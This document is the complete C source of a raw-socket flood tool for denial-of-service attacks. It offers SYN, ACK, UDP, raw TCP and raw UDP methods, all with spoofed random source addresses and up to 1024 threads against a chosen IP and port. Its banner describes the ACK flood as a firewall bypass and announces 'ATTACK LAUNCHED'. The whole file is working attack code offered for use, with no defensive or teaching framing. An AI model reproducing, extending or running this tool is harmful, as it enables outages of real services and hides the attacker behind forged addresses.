/* made by dupewon */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>


static volatile int g_running = 1;
static unsigned long long g_packets_sent = 0;
static pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    char target_ip[64];
    int target_port;
    int method;
} flood_config_t;

static flood_config_t g_config;



static uint32_t rand_ip(void) {
    uint32_t ip;
    do {
        ip = (uint32_t)rand() << 16 | (uint32_t)rand();
    } while (
        (ip >> 24) == 0   ||
        (ip >> 24) == 10  ||
        (ip >> 24) == 127 ||
        (ip >> 24) == 224 ||
        (ip >> 24) >= 240
    );
    return ip;
}

static uint16_t rand_port(void) {
    return (uint16_t)(1024 + (rand() % 64511));
}


static uint16_t checksum(uint16_t *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *(uint8_t *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}


struct pseudo_header {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t length;
};

static uint16_t tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    char buf[65536];
    struct pseudo_header psh;
    int tcp_len = sizeof(struct tcphdr);

    psh.src_addr   = iph->saddr;
    psh.dst_addr   = iph->daddr;
    psh.placeholder = 0;
    psh.protocol   = IPPROTO_TCP;
    psh.length     = htons(tcp_len);

    memcpy(buf, &psh, sizeof(psh));
    memcpy(buf + sizeof(psh), tcph, tcp_len);

    return checksum((uint16_t *)buf, sizeof(psh) + tcp_len);
}

static uint16_t udp_checksum(struct iphdr *iph, struct udphdr *udph, char *payload, int payload_len) {
    char buf[65536];
    struct pseudo_header psh;
    int udp_len = sizeof(struct udphdr) + payload_len;

    psh.src_addr    = iph->saddr;
    psh.dst_addr    = iph->daddr;
    psh.placeholder = 0;
    psh.protocol    = IPPROTO_UDP;
    psh.length      = htons(udp_len);

    memcpy(buf, &psh, sizeof(psh));
    memcpy(buf + sizeof(psh), udph, sizeof(struct udphdr));
    if (payload_len > 0)
        memcpy(buf + sizeof(psh) + sizeof(struct udphdr), payload, payload_len);

    return checksum((uint16_t *)buf, sizeof(psh) + udp_len);
}


static void *syn_flood(void *arg) {
    (void)arg;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph   = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { perror("socket"); return NULL; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port   = htons(g_config.target_port);
    inet_pton(AF_INET, g_config.target_ip, &dest.sin_addr);

    while (g_running) {
        memset(packet, 0, sizeof(packet));


        iph->ihl      = 5;
        iph->version   = 4;
        iph->tos       = 0;
        iph->tot_len   = htons(sizeof(packet));
        iph->id        = htons(rand() % 65535);
        iph->frag_off  = 0;
        iph->ttl       = 64 + (rand() % 64);
        iph->protocol  = IPPROTO_TCP;
        iph->check     = 0;
        iph->saddr     = rand_ip();
        iph->daddr     = dest.sin_addr.s_addr;
        iph->check     = checksum((uint16_t *)iph, sizeof(struct iphdr));


        tcph->source  = htons(rand_port());
        tcph->dest    = htons(g_config.target_port);
        tcph->seq     = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff    = 5;
        tcph->syn     = 1;
        tcph->window  = htons(65535);
        tcph->check   = 0;
        tcph->urg_ptr = 0;
        tcph->check   = tcp_checksum(iph, tcph);

        sendto(sock, packet, sizeof(packet), 0,
               (struct sockaddr *)&dest, sizeof(dest));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }

    close(sock);
    return NULL;
}


static void *ack_flood(void *arg) {
    (void)arg;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph   = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { perror("socket"); return NULL; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port   = htons(g_config.target_port);
    inet_pton(AF_INET, g_config.target_ip, &dest.sin_addr);

    while (g_running) {
        memset(packet, 0, sizeof(packet));

        iph->ihl      = 5;
        iph->version   = 4;
        iph->tos       = 0;
        iph->tot_len   = htons(sizeof(packet));
        iph->id        = htons(rand() % 65535);
        iph->frag_off  = 0;
        iph->ttl       = 64 + (rand() % 64);
        iph->protocol  = IPPROTO_TCP;
        iph->check     = 0;
        iph->saddr     = rand_ip();
        iph->daddr     = dest.sin_addr.s_addr;
        iph->check     = checksum((uint16_t *)iph, sizeof(struct iphdr));


        tcph->source  = htons(rand_port());
        tcph->dest    = htons(g_config.target_port);
        tcph->seq     = htonl(rand());
        tcph->ack_seq = htonl(rand());
        tcph->doff    = 5;
        tcph->ack     = 1;
        tcph->window  = htons(65535);
        tcph->check   = 0;
        tcph->urg_ptr = 0;
        tcph->check   = tcp_checksum(iph, tcph);

        sendto(sock, packet, sizeof(packet), 0,
               (struct sockaddr *)&dest, sizeof(dest));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }

    close(sock);
    return NULL;
}


static void *udp_flood(void *arg) {
    (void)arg;

    char payload[1400];
    char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(payload)];
    struct iphdr *iph   = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data          = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) { perror("socket"); return NULL; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port   = htons(g_config.target_port);
    inet_pton(AF_INET, g_config.target_ip, &dest.sin_addr);

    while (g_running) {
        int payload_len = 512 + (rand() % 889);


        for (int i = 0; i < payload_len; i++)
            payload[i] = (char)(rand() % 256);

        int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
        memset(packet, 0, total_len);

        iph->ihl      = 5;
        iph->version   = 4;
        iph->tos       = 0;
        iph->tot_len   = htons(total_len);
        iph->id        = htons(rand() % 65535);
        iph->frag_off  = 0;
        iph->ttl       = 64 + (rand() % 64);
        iph->protocol  = IPPROTO_UDP;
        iph->check     = 0;
        iph->saddr     = rand_ip();
        iph->daddr     = dest.sin_addr.s_addr;
        iph->check     = checksum((uint16_t *)iph, sizeof(struct iphdr));

        udph->source = htons(rand_port());
        udph->dest   = htons(g_config.target_port);
        udph->len    = htons(sizeof(struct udphdr) + payload_len);
        udph->check  = 0;

        memcpy(data, payload, payload_len);
        udph->check = udp_checksum(iph, udph, payload, payload_len);

        sendto(sock, packet, total_len, 0,
               (struct sockaddr *)&dest, sizeof(dest));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }

    close(sock);
    return NULL;
}


static void *rawtcp_flood(void *arg) {
    (void)arg;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + 32];
    struct iphdr *iph   = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { perror("socket"); return NULL; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port   = htons(g_config.target_port);
    inet_pton(AF_INET, g_config.target_ip, &dest.sin_addr);

    uint8_t flag_combos[][6] = {
        {1, 0, 0, 0, 0, 0},
        {1, 1, 0, 0, 0, 0},
        {0, 1, 0, 0, 0, 0},
        {0, 0, 1, 0, 0, 0},
        {0, 1, 1, 0, 0, 0},
        {0, 0, 0, 1, 0, 0},
        {0, 1, 0, 0, 1, 0},
        {1, 0, 0, 0, 0, 1},
        {0, 0, 0, 0, 0, 0},
        {1, 1, 1, 0, 1, 1},
    };
    int num_combos = sizeof(flag_combos) / sizeof(flag_combos[0]);

    while (g_running) {
        int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        memset(packet, 0, total_len);

        iph->ihl      = 5;
        iph->version   = 4;
        iph->tos       = 0;
        iph->tot_len   = htons(total_len);
        iph->id        = htons(rand() % 65535);
        iph->frag_off  = 0;
        iph->ttl       = 64 + (rand() % 64);
        iph->protocol  = IPPROTO_TCP;
        iph->check     = 0;
        iph->saddr     = rand_ip();
        iph->daddr     = dest.sin_addr.s_addr;
        iph->check     = checksum((uint16_t *)iph, sizeof(struct iphdr));

        int idx = rand() % num_combos;
        tcph->source  = htons(rand_port());
        tcph->dest    = htons(g_config.target_port);
        tcph->seq     = htonl(rand());
        tcph->ack_seq = htonl(rand());
        tcph->doff    = 5;
        tcph->syn     = flag_combos[idx][0];
        tcph->ack     = flag_combos[idx][1];
        tcph->fin     = flag_combos[idx][2];
        tcph->rst     = flag_combos[idx][3];
        tcph->psh     = flag_combos[idx][4];
        tcph->urg     = flag_combos[idx][5];
        tcph->window  = htons(rand() % 65535);
        tcph->check   = 0;
        tcph->urg_ptr = 0;
        tcph->check   = tcp_checksum(iph, tcph);

        sendto(sock, packet, total_len, 0,
               (struct sockaddr *)&dest, sizeof(dest));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }

    close(sock);
    return NULL;
}


static void *rawudp_flood(void *arg) {
    (void)arg;

    char payload[1472];
    char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(payload)];
    struct iphdr *iph   = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data          = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) { perror("socket"); return NULL; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));


    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port   = htons(g_config.target_port);
    inet_pton(AF_INET, g_config.target_ip, &dest.sin_addr);


    for (int i = 0; i < (int)sizeof(payload); i++)
        payload[i] = (char)(rand() % 256);

    while (g_running) {
        int payload_len = sizeof(payload);
        int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
        memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr));

        iph->ihl      = 5;
        iph->version   = 4;
        iph->tos       = 0;
        iph->tot_len   = htons(total_len);
        iph->id        = htons(rand() % 65535);
        iph->frag_off  = htons(0x4000);
        iph->ttl       = 64 + (rand() % 64);
        iph->protocol  = IPPROTO_UDP;
        iph->check     = 0;
        iph->saddr     = rand_ip();
        iph->daddr     = dest.sin_addr.s_addr;
        iph->check     = checksum((uint16_t *)iph, sizeof(struct iphdr));

        udph->source = htons(rand_port());
        udph->dest   = htons(g_config.target_port);
        udph->len    = htons(sizeof(struct udphdr) + payload_len);
        udph->check  = 0;

        memcpy(data, payload, payload_len);


        data[rand() % payload_len] = (char)(rand() % 256);
        data[rand() % payload_len] = (char)(rand() % 256);
        data[rand() % payload_len] = (char)(rand() % 256);
        data[rand() % payload_len] = (char)(rand() % 256);

        udph->check = udp_checksum(iph, udph, data, payload_len);

        sendto(sock, packet, total_len, 0,
               (struct sockaddr *)&dest, sizeof(dest));

        pthread_mutex_lock(&g_lock);
        g_packets_sent++;
        pthread_mutex_unlock(&g_lock);
    }

    close(sock);
    return NULL;
}


static void sig_handler(int sig) {
    (void)sig;
    g_running = 0;
}

static void *stats_thread(void *arg) {
    int duration = *(int *)arg;
    time_t start = time(NULL);
    unsigned long long last_count = 0;

    printf("\n");
    while (g_running) {
        sleep(1);
        time_t elapsed = time(NULL) - start;

        if (duration > 0 && elapsed >= duration) {
            g_running = 0;
            break;
        }

        pthread_mutex_lock(&g_lock);
        unsigned long long current = g_packets_sent;
        pthread_mutex_unlock(&g_lock);

        unsigned long long pps = current - last_count;
        last_count = current;

        printf("\r  [*] elapsed: %lds | packets: %llu | pps: %llu   ",
               (long)elapsed, current, pps);
        fflush(stdout);
    }

    printf("\n\n  [+] attack finished. total packets: %llu\n\n", g_packets_sent);
    return NULL;
}


static void usage(const char *prog) {
    printf("\n");
    printf("  ╔══════════════════════════════════════════════╗\n");
    printf("  ║          RAW SOCKET FLOOD TOOL               ║\n");
    printf("  ║    syn | ack | udp | rawtcp | rawudp         ║\n");
    printf("  ╚══════════════════════════════════════════════╝\n");
    printf("\n");
    printf("  usage: %s <ip> <port> <method> <threads> <duration>\n", prog);
    printf("\n");
    printf("  methods:\n");
    printf("    syn     — SYN flood (half-open connections)\n");
    printf("    ack     — ACK flood (stateful firewall bypass)\n");
    printf("    udp     — UDP flood (random payload 512-1400b)\n");
    printf("    rawtcp  — raw TCP with random flag combos\n");
    printf("    rawudp  — raw UDP max payload (1472b)\n");
    printf("\n");
    printf("  example: %s 1.2.3.4 80 syn 100 60\n", prog);
    printf("           sends SYN flood to 1.2.3.4:80 with 100 threads for 60s\n");
    printf("\n");
    printf("  duration 0 = infinite (stop with ctrl+c)\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        usage(argv[0]);
        return 1;
    }

    if (getuid() != 0) {
        fprintf(stderr, "\n  [!] raw sockets require root. run with sudo.\n\n");
        return 1;
    }

    strncpy(g_config.target_ip, argv[1], sizeof(g_config.target_ip) - 1);
    g_config.target_port = atoi(argv[2]);
    int threads  = atoi(argv[4]);
    int duration = atoi(argv[5]);


    struct in_addr test_addr;
    if (inet_pton(AF_INET, g_config.target_ip, &test_addr) != 1) {
        fprintf(stderr, "\n  [!] invalid target ip: %s\n\n", g_config.target_ip);
        return 1;
    }

    if (g_config.target_port < 1 || g_config.target_port > 65535) {
        fprintf(stderr, "\n  [!] invalid port: %d\n\n", g_config.target_port);
        return 1;
    }

    if (threads < 1) threads = 1;
    if (threads > 1024) threads = 1024;


    void *(*flood_func)(void *) = NULL;
    const char *method_name = NULL;

    if (strcmp(argv[3], "syn") == 0) {
        g_config.method = 0;
        flood_func = syn_flood;
        method_name = "SYN FLOOD";
    } else if (strcmp(argv[3], "ack") == 0) {
        g_config.method = 1;
        flood_func = ack_flood;
        method_name = "ACK FLOOD";
    } else if (strcmp(argv[3], "udp") == 0) {
        g_config.method = 2;
        flood_func = udp_flood;
        method_name = "UDP FLOOD";
    } else if (strcmp(argv[3], "rawtcp") == 0) {
        g_config.method = 3;
        flood_func = rawtcp_flood;
        method_name = "RAW TCP FLOOD";
    } else if (strcmp(argv[3], "rawudp") == 0) {
        g_config.method = 4;
        flood_func = rawudp_flood;
        method_name = "RAW UDP FLOOD";
    } else {
        fprintf(stderr, "\n  [!] unknown method: %s\n", argv[3]);
        fprintf(stderr, "  [!] valid: syn | ack | udp | rawtcp | rawudp\n\n");
        return 1;
    }


    srand((unsigned int)(time(NULL) ^ getpid()));

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    printf("\n");
    printf("  ╔══════════════════════════════════════════════╗\n");
    printf("  ║              ATTACK LAUNCHED                 ║\n");
    printf("  ╠══════════════════════════════════════════════╣\n");
    printf("  ║  target  : %-33s║\n", g_config.target_ip);
    printf("  ║  port    : %-33d║\n", g_config.target_port);
    printf("  ║  method  : %-33s║\n", method_name);
    printf("  ║  threads : %-33d║\n", threads);
    printf("  ║  duration: %-33d║\n", duration);
    printf("  ╚══════════════════════════════════════════════╝\n");


    pthread_t *tids = malloc(sizeof(pthread_t) * threads);
    for (int i = 0; i < threads; i++) {
        pthread_create(&tids[i], NULL, flood_func, NULL);
    }


    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, &duration);


    pthread_join(stats_tid, NULL);


    g_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }

    free(tids);
    return 0;
}
